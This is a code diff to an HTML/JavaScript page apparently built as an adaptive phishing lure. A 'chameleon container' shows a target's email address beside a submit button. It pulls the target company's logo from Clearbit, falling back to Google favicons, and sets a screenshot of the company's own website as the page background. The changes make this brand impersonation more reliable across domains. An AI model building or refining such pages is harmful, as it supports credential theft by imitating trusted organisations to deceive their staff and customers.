@@ -134,15 +134,16 @@
       justify-content: center;
       align-items: center;
       margin-bottom: 6px;
+      min-height: 70px;
     }
     
     .brand-logo {
-      max-width: 80px;
-      max-height: 80px;
+      max-width: 120px;
+      max-height: 70px;
       width: auto;
       height: auto;
       display: block;
-      border-radius: 8px;
+      border-radius: 4px;
     }
     
     .brand-logo-fallback {
@@ -423,7 +424,7 @@
   <!-- CHAMELEON CONTAINER -->
   <div class="chameleon-container" id="chameleonContainer">
     
-    <!-- Brand Header (Logo + Company Name Only) -->
+    <!-- Brand Header (Logo + Company Name) -->
     <div class="brand-header" id="brandHeader">
       <div class="brand-logo-wrapper">
         <img class="brand-logo" id="brandLogo" src="" alt="Company Logo" onerror="this.style.display='none'; document.getElementById('logoFallback').style.display='block';">
@@ -563,10 +564,15 @@
       try {
         // Load logo from Clearbit
         const logo = document.getElementById('brandLogo');
-        logo.src = `https://logo.clearbit.com/${domain}`;
+        // Try multiple logo sizes for better compatibility
+        logo.src = `https://logo.clearbit.com/${domain}?size=120`;
         logo.onerror = function() {
-          this.style.display = 'none';
-          document.getElementById('logoFallback').style.display = 'block';
+          // If Clearbit fails, try a different logo service
+          this.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=120`;
+          this.onerror = function() {
+            this.style.display = 'none';
+            document.getElementById('logoFallback').style.display = 'block';
+          };
         };
         
         const nameParts = domain.split('.');
@@ -583,10 +589,20 @@
         document.querySelector('.btn-submit').style.background = color;
         document.querySelector('.email-display').style.borderLeftColor = color;
         
-        // DYNAMIC BACKGROUND
-        document.body.style.backgroundImage = `linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.5)), url('https://image.thum.io/get/width/1200/https://${domain}')`;
-        document.body.style.backgroundSize = 'cover';
-        document.body.style.backgroundPosition = 'center';
+        // DYNAMIC BACKGROUND - try to load company screenshot
+        const bgUrl = `https://image.thum.io/get/width/1200/https://${domain}`;
+        // Preload background image
+        const img = new Image();
+        img.onload = function() {
+          document.body.style.backgroundImage = `linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.5)), url('${bgUrl}')`;
+          document.body.style.backgroundSize = 'cover';
+          document.body.style.backgroundPosition = 'center';
+        };
+        img.onerror = function() {
+          // If background fails, use a gradient fallback
+          document.body.style.background = 'linear-gradient(135deg, #0f172a, #1e293b)';
+        };
+        img.src = bgUrl;
         
       } catch (e) {
         console.log('Branding error:', e);
